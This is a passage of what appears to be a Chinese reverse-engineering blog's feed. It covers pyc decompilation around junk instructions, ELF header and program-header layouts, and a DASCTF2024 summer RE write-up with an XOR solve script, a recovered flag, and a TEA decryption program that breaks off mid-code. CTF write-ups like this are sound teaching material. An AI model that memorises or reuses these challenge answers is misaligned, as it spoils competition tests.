href="https://bbs.kanxue.com/thread-63160.htm">翻译]《IDA pro plugin writing in C&#x2F;C++》[2008-07-28第二次更新]-软件逆向-看雪-安全社区|安全招聘|kanxue.com</a></p><p><a href="https://github.com/notify-bibi/ScyllaHide-IDA7.5/releases/tag/0.2">Release ScyllaHide-IDA7.5 · notify-bibi&#x2F;ScyllaHide-IDA7.5 · GitHub</a></p><h3 id="web入门"><a href="#web入门" class="headerlink" title="web入门"></a>web入门</h3><p><a href="https://www.pri87.vip/posts/f3edc96d.html">web入门</a></p><h3 id="elf文件结构"><a href="#elf文件结构" class="headerlink" title="elf文件结构"></a>elf文件结构</h3><p><a href="https://www.pri87.vip/posts/e60119a.html">ELF文件结构</a></p><h3 id="pyc与花指令"><a href="#pyc与花指令" class="headerlink" title="pyc与花指令"></a>pyc与花指令</h3><p><a href="https://www.pri87.vip/posts/96b00b8.html">pyc与花指令</a></p>]]></content>
    
    
    <summary type="html">就是你，暑假不许学习，听到了没有</summary>
    
    
    
    
    <category term="放假" scheme="https://www.pri87.vip/tags/%E6%94%BE%E5%81%87/"/>
    
    <category term="开摆" scheme="https://www.pri87.vip/tags/%E5%BC%80%E6%91%86/"/>
    
  </entry>
  
  <entry>
    <title>pyc与花指令</title>
    <link href="https://www.pri87.vip/posts/96b00b8.html"/>
    <id>https://www.pri87.vip/posts/96b00b8.html</id>
    <published>2024-07-27T06:22:25.000Z</published>
    <updated>2024-08-05T15:10:02.997Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Pycdc反编译器"><a href="#Pycdc反编译器" class="headerlink" title="Pycdc反编译器"></a>Pycdc反编译器</h2><p><a href="https://github.com/zrax/pycdc">GitHub - zrax&#x2F;pycdc: C++ python bytecode disassembler and decompiler</a></p><p>用这个可以方便地反编译高版本代码 </p><h2 id="花指令或者反编译无效"><a href="#花指令或者反编译无效" class="headerlink" title="花指令或者反编译无效"></a>花指令或者反编译无效</h2><p>取巧的一个方法就是</p><p>用dis的dis</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"><span class="keyword">import</span> dis</span><br><span class="line">fp = <span class="built_in">open</span>(<span class="string">r&quot;./NSSCTF.pyc&quot;</span>,<span class="string">&quot;rb&quot;</span>)</span><br><span class="line">data = fp.read()</span><br><span class="line">Pyobj = marshal.loads(data[<span class="number">16</span>:])</span><br><span class="line">dis.dis(Pyobj)</span><br></pre></td></tr></table></figure><p>直接看字节码，然后让ai反编译</p><p>另一个方法</p><p>参考</p><p><a href="https://www.qinglite.cn/doc/27916618484af0123">技术分享 | Python逆向：修改Pycdc源码绕过花指令-轻识 (qinglite.cn)</a></p>]]></content>
    
    
    <summary type="html">本文介绍pycdc和python字节码无法反编译的情况要怎么办</summary>
    
    
    
    <category term="知识集" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/"/>
    
    
    <category term="re" scheme="https://www.pri87.vip/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>ELF文件结构</title>
    <link href="https://www.pri87.vip/posts/e60119a.html"/>
    <id>https://www.pri87.vip/posts/e60119a.html</id>
    <published>2024-07-21T13:18:13.000Z</published>
    <updated>2024-07-27T06:16:56.931Z</updated>
    
    <content type="html"><![CDATA[<hr><p>无限期停更<br><a href="https://sp4n9x.github.io/2021/05/27/ELF_FileFormat_Analysis/">ELF文件格式分析 | Sp4n9x’s Blog</a></p><p><a href="https://www.cnblogs.com/sky-heaven/p/15863815.html">手拆ELF32（一，文件头）【转】 - Sky&amp;Zhang - 博客园 (cnblogs.com)</a></p><p><a href="https://juejin.cn/post/7317577665015005223">ELF解析01 - ELF头和程序头 - 掘金 (juejin.cn)</a></p><p><a href="https://mudongliang.github.io/2015/05/19/elf-section-header-data-structure.html">ELF Section Header的结构 (mudongliang.github.io)</a></p><p>因为上面几篇讲的太详细了，后面不写了</p><p>其中第三篇为加载时需要关注的点，前两篇都是讲结构特点</p><hr><p>上次了解了windows系统上的PE文件结构，这里在网上总结了一些（抄了一些）内容</p><h2 id="序"><a href="#序" class="headerlink" title="序"></a>序</h2><p>ELF分为大致分为三种：</p><ul><li>可重定位文件(relocatable)：编译器和汇编器产生的.o文件，被Linker所处理</li><li>可执行文件(executable)：Linker对.o文件进行处理输出的文件，进程映像</li><li>共享对象文件(shared object)：动态库文件.so</li></ul><p>文件布局大致为：</p><ul><li>ELF header</li><li>program header table（描述段）</li><li>段和区</li><li>section header table（描述区）</li></ul><p>以上的布局只有ELF header在固定位置，其它的位置不定</p><h2 id="ELF-header"><a href="#ELF-header" class="headerlink" title="ELF header"></a>ELF header</h2><h3 id="e-ident"><a href="#e-ident" class="headerlink" title="e_ident"></a>e_ident</h3><p><code>Magic Number</code>  7F 45 4C 46</p><p>EI_class：(1字节)</p><ul><li>无效类</li><li>1 32位</li><li>2 64位</li></ul><p>EI_DATA：(1字节)</p><ul><li>0 无效数据编码</li><li>1 小端序</li><li>2 大端序</li></ul><p>EI_VERSION：只有01这个值</p><p>EI_OSABI：操作系统&#x2F;ABI标识</p><table><thead><tr><th align="left">宏名称</th><th align="center">值</th><th align="left">含义</th></tr></thead><tbody><tr><td align="left">ELFOSABI_NONE</td><td align="center">0</td><td align="left">No extensions or unspecified</td></tr><tr><td align="left">ELFOSABI_SYSV</td><td align="center">0</td><td align="left">UNIX System V ABI</td></tr><tr><td align="left">ELFOSABI_HPUX</td><td align="center">1</td><td align="left">HP-UX ABI</td></tr><tr><td align="left">ELFOSABI_NETBSD</td><td align="center">2</td><td align="left">NetBSD ABI</td></tr><tr><td align="left">ELFOSABI_LINUX</td><td align="center">3</td><td align="left">Linux ABI</td></tr><tr><td align="left">ELFOSABI_HURD</td><td align="center">4</td><td align="left">GNU Hurd ABI</td></tr><tr><td align="left">ELFOSABI_SOLARIS</td><td align="center">6</td><td align="left">Sun Solaris ABI</td></tr><tr><td align="left">ELFOSABI_AIX</td><td align="center">7</td><td align="left">IBM AIX ABI</td></tr><tr><td align="left">ELFOSABI_IRIX</td><td align="center">8</td><td align="left">SGI Irix ABI</td></tr><tr><td align="left">ELFOSABI_FREEBSD</td><td align="center">9</td><td align="left">FreeBSD ABI</td></tr><tr><td align="left">ELFOSABI_TRU64</td><td align="center">10</td><td align="left">Compaq TRU64 UNIX ABI</td></tr><tr><td align="left">ELFOSABI_MODESTO</td><td align="center">11</td><td align="left">Novell Modesto ABI</td></tr><tr><td align="left">ELFOSABI_OPENBSD</td><td align="center">12</td><td align="left">OpenBSD ABI</td></tr><tr><td align="left">ELFOSABI_OPENVMS</td><td align="center">13</td><td align="left">OpenVMS ABI</td></tr><tr><td align="left">ELFOSABI_NSK</td><td align="center">14</td><td align="left">NonStop Kernel ABI</td></tr><tr><td align="left">ELFOSABI_AROS</td><td align="center">15</td><td align="left">AROS ABI</td></tr><tr><td align="left">ELFOSABI_FENIXOS</td><td align="center">16</td><td align="left">Fenix OS ABI</td></tr><tr><td align="left">ELFOSABI_CLOUDABI</td><td align="center">17</td><td align="left">CloudABI</td></tr><tr><td align="left">ELFOSABI_ARM_AEABI</td><td align="center">64</td><td align="left">ARM EABI</td></tr><tr><td align="left">ELFOSABI_ARM</td><td align="center">97</td><td align="left">ARM ABI</td></tr><tr><td align="left">ELFOSABI_STANDALONE</td><td align="center">255</td><td align="left">Standalone (embedded) application</td></tr></tbody></table><p>EI_ABIVERSION：</p><p>进一步指定ABI版本</p><p>elf pad：填充字节，置0</p><h3 id="E-TYPE"><a href="#E-TYPE" class="headerlink" title="E_TYPE"></a>E_TYPE</h3><p>标明文件类型（2字节）</p><table><thead><tr><th align="left">宏名称</th><th align="center">值</th><th align="left">含义</th></tr></thead><tbody><tr><td align="left">ET_NONE</td><td align="center">0</td><td align="left">无文件类型</td></tr><tr><td align="left">ET_REL</td><td align="center">1</td><td align="left">可重定位文件</td></tr><tr><td align="left">ET_EXEC</td><td align="center">2</td><td align="left">可执行文件</td></tr><tr><td align="left">ET_DYN</td><td align="center">3</td><td align="left">共享目标文件</td></tr><tr><td align="left">ET_CORE</td><td align="center">4</td><td align="left">核心转储文件</td></tr><tr><td align="left">ET_NUM</td><td align="center">5</td><td align="left">定义的文件类型数量</td></tr><tr><td align="left">ET_LOOS</td><td align="center">0xFE00</td><td align="left">特定操作系统目标文件类型值范围的下限</td></tr><tr><td align="left">ET_HIOS</td><td align="center">0xFEFF</td><td align="left">特定操作系统目标文件类型值范围的上限</td></tr><tr><td align="left">ET_LOPROC</td><td align="center">0xFF00</td><td align="left">特定处理器目标文件类型值范围的下限</td></tr><tr><td align="left">ET_HIPROC</td><td align="center">0xFFFF</td><td align="left">特定处理器目标文件类型值范围的上限</td></tr></tbody></table><h3 id="e-machine"><a href="#e-machine" class="headerlink" title="e_machine"></a>e_machine</h3><p>标明处理器架构和指令集（2字节）</p><table><thead><tr><th align="left">宏名称</th><th align="center">值</th><th align="left">含义</th></tr></thead><tbody><tr><td align="left">EM_NONE</td><td align="center">0</td><td align="left">无机器类型</td></tr><tr><td align="left">EM_M32</td><td align="center">1</td><td align="left">AT&amp;T WE 32100</td></tr><tr><td align="left">EM_SPARC</td><td align="center">2</td><td align="left">SUN SPARC</td></tr><tr><td align="left">EM_386</td><td align="center">3</td><td align="left">Intel 80386(x86)</td></tr><tr><td align="left">EM_68K</td><td align="center">4</td><td align="left">Motorola 68000(M68k)</td></tr><tr><td align="left">EM_88K</td><td align="center">5</td><td align="left">Motorola 88000(M88k)</td></tr><tr><td align="left">EM_860</td><td align="center">7</td><td align="left">Intel 80860</td></tr><tr><td align="left">EM_MIPS</td><td align="center">8</td><td align="left">MIPS R3000 big-endian</td></tr><tr><td align="left">EM_MIPS_RS3_LE</td><td align="center">10</td><td align="left">MIPS R3000 little-endian</td></tr><tr><td align="left">EM_MIPS_RS4_BE</td><td align="center">10</td><td align="left">MIPS R4000 big-endian</td></tr><tr><td align="left">EM_PPC</td><td align="center">20</td><td align="left">PowerPC</td></tr><tr><td align="left">EM_PPC64</td><td align="center">21</td><td align="left">PowerPC 64-bit</td></tr><tr><td align="left">EM_ARM</td><td align="center">40</td><td align="left">ARM 32-bit(up to ARMv7&#x2F;Aarch32)</td></tr><tr><td align="left">EM_SPARCV9</td><td align="center">43</td><td align="left">SPARC v9 64-bit</td></tr><tr><td align="left">EM_IA_64</td><td align="center">50</td><td align="left">HP&#x2F;Intel IA-64</td></tr><tr><td align="left">EM_X86_64</td><td align="center">62</td><td align="left">AMD x86-64</td></tr><tr><td align="left">EM_MSP430</td><td align="center">105</td><td align="left">Texas Instruments msp430</td></tr><tr><td align="left">EM_ALTERA_NIOS2</td><td align="center">113</td><td align="left">Altera Nios II</td></tr><tr><td align="left">EM_AARCH64</td><td align="center">183</td><td align="left">ARM 64-bit(ARMv8&#x2F;Aarch64)</td></tr><tr><td align="left">EM_AVR32</td><td align="center">185</td><td align="left">Amtel 32-bit microprocessor</td></tr><tr><td align="left">EM_STM8</td><td align="center">186</td><td align="left">STMicroelectronics STM8</td></tr><tr><td align="left">EM_RISCV</td><td align="center">243</td><td align="left">RISC-V</td></tr><tr><td align="left">EM_BPF</td><td align="center">247</td><td align="left">Linux BPF – in-kernel virtual machine</td></tr></tbody></table><h3 id="e-version"><a href="#e-version" class="headerlink" title="e_version"></a>e_version</h3><p>当前文件版本（四字节）</p><p>0 无版本</p><p>其它 当前版本号</p><h3 id="程序入口"><a href="#程序入口" class="headerlink" title="程序入口"></a>程序入口</h3><p>8字节，标明入口点</p><h3 id="程序头表偏移"><a href="#程序头表偏移" class="headerlink" title="程序头表偏移"></a>程序头表偏移</h3><p>8字节，描述段表在文件中的偏移</p><h3 id="区表偏移"><a href="#区表偏移" class="headerlink" title="区表偏移"></a>区表偏移</h3><p>8字节，描述区表在文件中的偏移</p><h3 id="e-flag"><a href="#e-flag" class="headerlink" title="e_flag"></a>e_flag</h3><p>处理器指定的与文件相关联的flag(4字节，一般是0)</p><h3 id="ELF-header-大小"><a href="#ELF-header-大小" class="headerlink" title="ELF_header 大小"></a>ELF_header 大小</h3><p>2字节，指明头大小。一般为0x40</p><h3 id="程序头表大小"><a href="#程序头表大小" class="headerlink" title="程序头表大小"></a>程序头表大小</h3><p>2字节，如果没有程序头表，则为0</p><h3 id="程序头内容数量"><a href="#程序头内容数量" class="headerlink" title="程序头内容数量"></a>程序头内容数量</h3><p>2字节，标明程序头表中的内容个数</p><h3 id="节区头表大小"><a href="#节区头表大小" class="headerlink" title="节区头表大小"></a>节区头表大小</h3><p>2字节，如果没有节区头表，则为0</p><h3 id="节区头内容数量"><a href="#节区头内容数量" class="headerlink" title="节区头内容数量"></a>节区头内容数量</h3><p>2字节，标明节区头表中的内容个数</p><h3 id="节区头字符表索引"><a href="#节区头字符表索引" class="headerlink" title="节区头字符表索引"></a>节区头字符表索引</h3><p>2字节，有以下可选值</p><p>&#x2F;* Special section indices. *&#x2F;</p><p>#define SHN_UNDEF 0 &#x2F;* Undefined section <em>&#x2F;<br>#define SHN_LORESERVE 0xff00 &#x2F;</em> Start of reserved indices <em>&#x2F;<br>#define SHN_LOPROC 0xff00 &#x2F;</em> Start of processor-specific <em>&#x2F;<br>#define SHN_BEFORE 0xff00 &#x2F;</em> Order section before all others<br>(Solaris). <em>&#x2F;<br>#define SHN_AFTER 0xff01 &#x2F;</em> Order section after all others<br>(Solaris). <em>&#x2F;<br>#define SHN_HIPROC 0xff1f &#x2F;</em> End of processor-specific <em>&#x2F;<br>#define SHN_LOOS 0xff20 &#x2F;</em> Start of OS-specific <em>&#x2F;<br>#define SHN_HIOS 0xff3f &#x2F;</em> End of OS-specific <em>&#x2F;<br>#define SHN_ABS 0xfff1 &#x2F;</em> Associated symbol is absolute <em>&#x2F;<br>#define SHN_COMMON 0xfff2 &#x2F;</em> Associated symbol is common <em>&#x2F;<br>#define SHN_XINDEX 0xffff &#x2F;</em> Index is in extra table. <em>&#x2F;<br>#define SHN_HIRESERVE 0xffff &#x2F;</em> End of reserved indices *&#x2F;</p><h2 id="program-header-table"><a href="#program-header-table" class="headerlink" title="program_header_table"></a>program_header_table</h2><p>是一个结构体数组</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PN_XNUM0xffff</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    Elf32_Wordp_type;<span class="comment">/* Segment type */</span></span><br><span class="line">    Elf32_Offp_offset;<span class="comment">/* Segment file offset */</span></span><br><span class="line">    Elf32_Addrp_vaddr;<span class="comment">/* Segment virtual address */</span></span><br><span class="line">    Elf32_Addrp_paddr;<span class="comment">/* Segment physical address */</span></span><br><span class="line">    Elf32_Wordp_filesz;<span class="comment">/* Segment size in file */</span></span><br><span class="line">    Elf32_Wordp_memsz;<span class="comment">/* Segment size in memory */</span></span><br><span class="line">    Elf32_Wordp_flags;<span class="comment">/* Segment flags */</span></span><br><span class="line">    Elf32_Wordp_align;<span class="comment">/* Segment alignment */</span></span><br><span class="line">&#125; Elf32_Phdr;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    Elf64_Wordp_type;<span class="comment">/* Segment type */</span></span><br><span class="line">    Elf64_Wordp_flags;<span class="comment">/* Segment flags */</span></span><br><span class="line">    Elf64_Offp_offset;<span class="comment">/* Segment file offset */</span></span><br><span class="line">    Elf64_Addrp_vaddr;<span class="comment">/* Segment virtual address */</span></span><br><span class="line">    Elf64_Addrp_paddr;<span class="comment">/* Segment physical address */</span></span><br><span class="line">    Elf64_Xwordp_filesz;<span class="comment">/* Segment size in file */</span></span><br><span class="line">    Elf64_Xwordp_memsz;<span class="comment">/* Segment size in memory */</span></span><br><span class="line">    Elf64_Xwordp_align;<span class="comment">/* Segment alignment */</span></span><br><span class="line">&#125; Elf64_Phdr;</span><br></pre></td></tr></table></figure><h3 id="段类型"><a href="#段类型" class="headerlink" title="段类型"></a>段类型</h3><p>p_type，四字节</p><table><thead><tr><th align="left">宏名称</th><th align="center">值</th><th align="left">含义</th></tr></thead><tbody><tr><td align="left">PT_NULL</td><td align="center">0</td><td align="left">该数组元素未使用。除p_type外，其他结构体成员的值都是未定义的。这种类型可以使程序头表(Program Header Table)忽略此条目。</td></tr><tr><td align="left">PT_LOAD</td><td align="center">1</td><td align="left">此类型段为一个可加载的段，大小由p_filesz和p_memsz描述。文件中该段的内容被映射到相应内存段的开始处。如果p_memsz大于p_filesz，“剩余”的字节都要被置为0并跟踪段的初始化区域。p_filesz不能大于p_memsz。可加载的段在程序头表中按照p_vaddr升序排列。</td></tr><tr><td align="left">PT_DYNAMIC</td><td align="center">2</td><td align="left">此类型段给出动态链接信息，具体参见ELF手册Book III。</td></tr><tr><td align="left">PT_INTERP</td><td align="center">3</td><td align="left">此类型段给出了一个以Null结尾的字符串的位置和长度，该字符串将被当作解释器的路径名进行调用。这种段类型仅对可执行文件有意义(也可能出现在共享目标文件中)。此外，这种段在一个文件中最多出现一次。而且该段类型的数组元素存在的话，它必须在所有可加载段条目的前面。</td></tr><tr><td align="left">PT_NOTE</td><td align="center">4</td><td align="left">此类型段给出附加信息的位置和大小。</td></tr><tr><td align="left">PT_SHLIB</td><td align="center">5</td><td align="left">该段类型被保留，不过语义未指定。而且，包含这种类型数组元素的程序不符合Unix System V的ELF标准，具体参见ELF手册Book III。</td></tr><tr><td align="left">PT_PHDR</td><td align="center">6</td><td align="left">该段类型的数组元素如果存在的话，则给出了程序头表自身在文件和程序内存映像中的的位置和大小。此类型的段在文件中最多出现一次。此外，只有程序头表是程序内存映像的一部分时，该段类型的数组元素才会存在。如果该段类型的数组元素存在，则必须在所有可加载段条目的前面。</td></tr><tr><td align="left">PT_TLS</td><td align="center">7</td><td align="left">该段类型的数组元素给出线程本地存储段(TLS)的信息。</td></tr><tr><td align="left">PT_LOOS</td><td align="center">0x60000000</td><td align="left">特定操作系统段类型值的下限。</td></tr><tr><td align="left">PT_GNU_EH_FRAME</td><td align="center">0x6474E550</td><td align="left">该段类型数组元素指定异常处理信息的位置和大小(由.eh_frame_hdr节定义)[^5]。</td></tr><tr><td align="left">PT_GNU_STACK</td><td align="center">0x6474E551</td><td align="left">该段类型数组元素中的p_flags成员指定包含栈的段的权限，并用于指示栈是否应该是可执行的。没有此段类型的数组元素，则表示该栈将是可执行的[^5]。</td></tr><tr><td align="left">PT_GNU_RELRO</td><td align="center">0x6474E552</td><td align="left">该段类型数组元素指定了一个在重定位后可以被置为只读的段的位置和大小[^5]。</td></tr><tr><td align="left">PT_GNU_PROPERTY</td><td align="center">0x6474E553</td><td align="left">该段类型数组元素指定.note.gnu.property节的位置和大小。</td></tr><tr><td align="left">PT_HIOS</td><td align="center">0x6FFFFFFF</td><td align="left">特定操作系统段类型值的上限。</td></tr><tr><td align="left">PT_LOPROC</td><td align="center">0x70000000</td><td align="left">特定处理器段类型值的下限。</td></tr><tr><td align="left">PT_HIPROC</td><td align="center">0x7FFFFFFF</td><td align="left">特定处理器段类型值的上限。</td></tr></tbody></table><h3 id="段权限"><a href="#段权限" class="headerlink" title="段权限"></a>段权限</h3><p>p_flags，四字节</p><table><thead><tr><th align="left">宏名称</th><th align="center">值</th><th align="left">含义</th></tr></thead><tbody><tr><td align="left">PF_X</td><td align="center">0x1</td><td align="left">段具有可执行权限</td></tr><tr><td align="left">PF_W</td><td align="center">0x2</td><td align="left">段具有写权限</td></tr><tr><td align="left">PF_R</td><td align="center">0x4</td><td align="left">段具有读权限</td></tr><tr><td align="left">PF_MASKOS</td><td align="center">0x0FF00000</td><td align="left">为特定操作系统预留</td></tr><tr><td align="left">PF_MASKPROC</td><td align="center">0xF0000000</td><td align="left">为特定处理器预留</td></tr></tbody></table><p>如果是0，表明拒绝访问<br>以上权限可组合，且一般情况，段没有写权限</p><table><thead><tr><th align="left">宏名称</th><th align="center">值</th><th align="left">准确的权限</th><th align="left">允许的权限</th></tr></thead><tbody><tr><td align="left">none</td><td align="center">0</td><td align="left">拒绝所有访问</td><td align="left">拒绝所有访问</td></tr><tr><td align="left">PF_X</td><td align="center">1</td><td align="left">只执行</td><td align="left">读，执行</td></tr><tr><td align="left">PF_W</td><td align="center">2</td><td align="left">只写</td><td align="left">读，写，执行</td></tr><tr><td align="left">PF_W + PF_X</td><td align="center">3</td><td align="left">写，执行</td><td align="left">读，写，执行</td></tr><tr><td align="left">PF_R</td><td align="center">4</td><td align="left">只读</td><td align="left">读，执行</td></tr><tr><td align="left">PF_R + PF_X</td><td align="center">5</td><td align="left">读，执行</td><td align="left">读，执行</td></tr><tr><td align="left">PF_R + PF_W</td><td align="center">6</td><td align="left">读，写</td><td align="left">读，写，执行</td></tr><tr><td align="left">PF_R + PF_W + PF_X</td><td align="center">7</td><td align="left">读，写，执行</td><td align="left">读，写，执行</td></tr></tbody></table><h3 id="段内容"><a href="#段内容" class="headerlink" title="段内容"></a>段内容</h3><p>Segment Contents标明了一个段的多种节的类型</p><h3 id="段偏移"><a href="#段偏移" class="headerlink" title="段偏移"></a>段偏移</h3><p>在文件中的偏移，8字节</p><h3 id="段虚拟地址"><a href="#段虚拟地址" class="headerlink" title="段虚拟地址"></a>段虚拟地址</h3><p>表示加载后的相对偏移。真实地址&#x3D;虚拟地址基址+段虚拟地址，8字节</p><h3 id="段物理地址"><a href="#段物理地址" class="headerlink" title="段物理地址"></a>段物理地址</h3><p>不知道作用，可能是在虚拟内存中的地址。8字节</p><h3 id="段文件长度"><a href="#段文件长度" class="headerlink" title="段文件长度"></a>段文件长度</h3><p>段在文件中的长度，8字节</p><h3 id="段虚拟长度"><a href="#段虚拟长度" class="headerlink" title="段虚拟长度"></a>段虚拟长度</h3><p>段在内存中的长度，8字节</p><h3 id="段对齐方式"><a href="#段对齐方式" class="headerlink" title="段对齐方式"></a>段对齐方式</h3><p>8字节，一般为4096</p><hr><p>参考：</p><p><a href="https://docs.oracle.com/cd/E26926_01/html/E25910/chapter6-35342.html">ELF 标识 - 链接程序和库指南 (oracle.com)</a></p><hr>]]></content>
    
    
    <summary type="html">全是抄的</summary>
    
    
    
    <category term="知识集" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/"/>
    
    
    <category term="PE文件结构" scheme="https://www.pri87.vip/tags/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/"/>
    
    <category term="ELF" scheme="https://www.pri87.vip/tags/ELF/"/>
    
  </entry>
  
  <entry>
    <title>DASCTF2024summer-RE</title>
    <link href="https://www.pri87.vip/posts/b7df16dd.html"/>
    <id>https://www.pri87.vip/posts/b7df16dd.html</id>
    <published>2024-07-21T09:42:35.000Z</published>
    <updated>2024-07-27T06:16:56.933Z</updated>
    
    <content type="html"><![CDATA[<p>第一次遇到DCT，QAQ，终究还是被暴打了</p><h2 id="DosSnake"><a href="#DosSnake" class="headerlink" title="DosSnake"></a>DosSnake</h2><p>考察16位汇编，大概打开看看，是一个贪吃蛇，按照游戏题的惯例，应当是胜利后自动输出flag</p><p>看一下有没有相关函数或者字符串</p><p>查字符串可以看到有DASCTF，然后交叉引用</p><p>大概是这样：</p><p><img src="https://s2.loli.net/2024/07/21/FtOvZPhXBp6o82c.png" alt="image-20240721174647593"></p><p>可以看到用（di）dasctf和（si）后面的位数依次异或，一轮后重置di</p><p>直接写脚本</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from prism import *</span><br><span class="line">a = [<span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x3F</span>, <span class="number">0x09</span>, <span class="number">0x63</span>, <span class="number">0x34</span>, <span class="number">0x32</span>, <span class="number">0x13</span>, <span class="number">0x2A</span>, <span class="number">0x2F</span>, <span class="number">0x2A</span>, <span class="number">0x37</span>, <span class="number">0x3C</span>, <span class="number">0x23</span>, <span class="number">0x00</span>, <span class="number">0x2E</span>, <span class="number">0x20</span>, <span class="number">0x10</span>, <span class="number">0x3A</span>, <span class="number">0x27</span>, <span class="number">0x2F</span>, <span class="number">0x24</span>, <span class="number">0x3A</span>, <span class="number">0x30</span>, <span class="number">0x75</span>, <span class="number">0x67</span>, <span class="number">0x65</span>, <span class="number">0x3C</span>]</span><br><span class="line">c = [<span class="number">0x44</span>, <span class="number">0x41</span>, <span class="number">0x53</span>, <span class="number">0x43</span>, <span class="number">0x54</span>, <span class="number">0x46</span>]</span><br><span class="line"><span class="keyword">pxor</span>(a,c)</span><br><span class="line"># DASCTF&#123;H0wfUnnytheDosSnakeis!!!&#125;</span><br></pre></td></tr></table></figure><h2 id="Strangeprograme"><a href="#Strangeprograme" class="headerlink" title="Strangeprograme"></a>Strangeprograme</h2><p>常规TEA，不多说</p><p>反调，附加调试进入主要判断逻辑</p><p>加密是一样的，区别是只加密第一组数据，然后异或后面的数据</p><p>直接写脚本解</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> __cdecl <span class="title">enc</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span>* a1, <span class="type">unsigned</span> <span class="type">int</span>* a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [esp+DCh] [ebp-2Ch]</span></span><br><span class="line"><span class="type">int</span> v3; <span class="comment">// [esp+E8h] [ebp-20h]</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [esp+F4h] [ebp-14h]</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [esp+100h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//sub_4114D8(&amp;unk_4250F3);</span></span><br><span class="line">v5 = *a1;</span><br><span class="line">v4 = a1[<span class="number">1</span>];</span><br><span class="line">v3 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; ++i)</span><br><span class="line">&#123;</span><br><span class="line">v5 += (a2[<span class="number">1</span>] + (v4 &gt;&gt; <span class="number">5</span>)) ^ (v3 + v4) ^ (*a2 + <span class="number">16</span> * v4);</span><br><span class="line">v4 += (a2[<span class="number">3</span>] + (v5 &gt;&gt; <span class="number">5</span>)) ^ (v3 + v5) ^ (a2[<span class="number">2</span>] + <span class="number">16</span> * v5);</span><br><span class="line">v3 -= <span class="number">0x61C88647</span>;</span><br><span class="line">&#125;</span><br><span class="line">*a1 = v5;</span><br><span class="line">a1[<span class="number">1</span>] = v4;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> __cdecl <span class="title">dec</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span>* a1, <span class="type">unsigned</span> <span class="type">int</span>* a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [esp+DCh] 